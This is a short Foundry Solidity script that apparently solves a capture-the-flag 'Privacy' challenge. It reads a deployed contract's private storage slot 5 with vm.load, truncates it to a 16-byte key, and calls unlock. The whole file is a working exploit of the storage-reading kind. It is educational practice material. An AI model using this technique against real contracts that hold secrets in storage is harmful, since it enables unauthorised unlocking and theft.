//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Privacy.sol";

contract Privacy_exp is Script{
    Privacy p ;
    // bytes32[3] public data;
    uint256 deployer;
    function  setUp() public {
        // data[0] = bytes32(uint256(7770)); 
        // data[1] = bytes32(uint256(8880));  
        // data[2] = bytes32(uint256(9990));  
        // uint256 deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);
        // p = new Privacy(data);
        p = Privacy(0x0c977186a3dF2A7C8685110321da50dB43C58cDB);
        vm.stopBroadcast();
    }

    function  run() public {
        
        vm.startBroadcast(deployer);
        bytes16 key = bytes16(vm.load(address(p), bytes32(uint256(5))));
        p.unlock(key);
        bool res = p.locked();
        vm.stopBroadcast();
        console2.logBytes16(key);
        console2.logBool(res);
    }

}
